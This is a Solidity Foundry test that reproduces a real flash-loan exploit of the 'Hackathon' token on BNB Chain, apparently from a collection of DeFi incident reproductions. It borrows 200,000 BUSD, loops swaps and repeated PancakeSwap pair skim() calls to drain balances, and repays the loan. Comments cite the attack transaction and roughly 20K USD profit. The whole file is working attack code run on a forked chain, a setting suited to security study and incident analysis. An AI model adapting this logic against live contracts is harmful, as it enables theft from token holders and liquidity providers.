// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0xea181f730886ece947e255ab508f5af1d0f569fee3368b651d5dbb28549087b5
// GUY : https://x.com/EXVULSEC/status/1779519508375613827
// Profit : ~20K USD

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakePair Pair = IPancakePair(0xd46f4a4B57D8EC355fe83F9AE75d4cC04DE371ED);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 Hackathon = IERC20(0x11cee747Faaf0C0801075253ac28aB503C888888);


    function setUp() public {
        cheats.createSelectFork("bsc", 37854043);
        deal(address(BUSD),address(this),0);

    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "attacker balance BUSD before attack:", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
        DPP.flashLoan(0, 200000 ether, address(this), new bytes(1));
        emit log_named_decimal_uint(
            "attacker balance BUSD after attack:", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
            BUSD.approve(address(Pair), type(uint256).max);
            BUSD.approve(address(Router), type(uint256).max);
            uint256 j=0;
            while(j<10){
                uint256 i=0;
                swap_token_to_token(address(BUSD), address(Hackathon), 200000 * 1e18);
                Hackathon.transfer(address(Pair),Hackathon.balanceOf(address(this)));
                while (i < 10) {
                    Pair.skim(address(Pair));
                    Pair.skim(address(this));
                    i++;
                }
                swap_token_to_token(address(Hackathon), address(BUSD), Hackathon.balanceOf(address(this)));
                j++;
            }
            BUSD.transfer(address(msg.sender),quoteAmount);
    }
        function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
